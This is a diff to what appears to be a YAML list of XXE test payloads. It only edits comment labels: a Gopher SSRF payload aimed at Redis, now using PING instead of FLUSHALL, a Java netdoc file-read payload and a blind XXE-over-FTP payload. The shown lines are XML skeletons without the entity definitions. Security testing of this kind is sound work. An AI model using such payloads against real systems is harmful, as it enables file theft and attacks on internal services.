@@ -214,6 +214,7 @@ payloads:
     <foo>&xxe;</foo>
 
   # Gopher Protocol SSRF (non-destructive - Redis PING)
+  # Updated for safety: used PING instead of FLUSHALL
   - |
     <?xml version="1.0"?>
     <!DOCTYPE foo [
@@ -229,7 +230,7 @@ payloads:
     ]>
     <foo>&xxe;</foo>
 
-  # Java netdoc:// Protocol - File Read
+  # Netdoc Protocol (Java) - Read arbitrary files
   - |
     <?xml version="1.0"?>
     <!DOCTYPE foo [
@@ -237,7 +238,7 @@ payloads:
     ]>
     <foo>&xxe;</foo>
 
-  # Blind XXE with FTP
+  # Blind XXE with FTP (Updated credentials placeholder)
   - |
     <?xml version="1.0"?>
     <!DOCTYPE foo [
